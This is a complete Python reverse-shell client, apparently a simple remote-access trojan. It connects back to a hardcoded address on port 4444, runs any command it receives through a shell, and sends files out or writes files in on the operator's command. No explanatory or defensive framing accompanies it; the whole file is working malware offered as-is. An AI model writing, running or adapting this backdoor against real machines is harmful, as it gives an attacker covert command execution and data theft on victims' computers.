import socket
import json
import subprocess
import os
import base64
import time

def server(ip, port):
    global connection
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            connection.connect((ip, port))
            break
        except ConnectionRefusedError:
            time.sleep(5)

def send(data):
    try:
        json_data = json.dumps(data)
        connection.send(json_data.encode('utf-8'))
    except Exception as e:
        print(f"[ERROR] Failed to send data: {e}")

def receive():
    json_data = ''
    while True:
        try:
            part = connection.recv(1024).decode('utf-8')
            if not part:
                break
            json_data += part
            return json.loads(json_data)
        except ValueError:
            continue
        except Exception as e:
            print(f"[ERROR] Failed to receive data: {e}")
            break

def run():
    while True:
        command = receive()
        if command == 'exit':
            connection.close()
            break
        elif command.startswith('cd ') and len(command) > 3:
            try:
                os.chdir(command[3:])
            except FileNotFoundError:
                send("Directory not found")
            except Exception as e:
                send(f"Error changing directory: {e}")
        elif command.startswith('download '):
            filename = command[9:]
            try:
                with open(filename, 'rb') as f:
                    send(base64.b64encode(f.read()).decode('utf-8'))
            except Exception as e:
                send(f"Error downloading file: {e}")
        elif command.startswith('upload '):
            filename = command[7:]
            try:
                with open(filename, 'wb') as f:
                    file_data = receive()
                    f.write(base64.b64decode(file_data))
            except Exception as e:
                send(f"Error uploading file: {e}")
        else:
            try:
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                result = process.stdout.read() + process.stderr.read()
                send(result)
            except Exception as e:
                send(f"Error executing command: {e}")

server('172.20.10.2', 4444)
run()
